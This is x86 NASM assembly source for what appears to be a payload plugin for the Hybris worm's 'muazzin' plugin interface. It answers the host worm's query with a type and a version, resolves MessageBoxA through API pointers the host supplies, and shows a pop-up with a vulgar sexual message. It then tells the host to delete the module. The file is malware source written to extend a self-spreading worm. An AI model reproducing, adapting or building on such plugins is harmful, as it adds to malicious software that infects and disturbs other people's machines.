BITS 32

%include "\muazzin\muazzin.asi"

TYPE    EQU "bill"
VERSION EQU 0001h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_APP
       jnz payload
       test dword [esi+m_why], MT_QUERY
       jz .exit
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
  .exit:
       ret 4

payload:
       call .kernel32
       db "KERNEL32.DLL",0
  .kernel32:
       call [esi+GMH]
       call .loadlib
       db "LoadLibraryA",0
  .loadlib:
       push eax
       call [esi+GPA]
       call .user32
       db "USER32.DLL",0
  .user32:
       call eax
       call .msgbox
       db "MessageBoxA",0
  .msgbox:
       push eax
       call [esi+GPA]
       push byte 0
       call .tmp1
       db "Hybris muazzin request",0
  .tmp1:
       call .tmp2
       db "Bill likes them big ol' titties",0
  .tmp2:
       push byte 0
       call eax
       mov dword [esi+m_result], MR_DONE+MR_DELETE
       ret 4
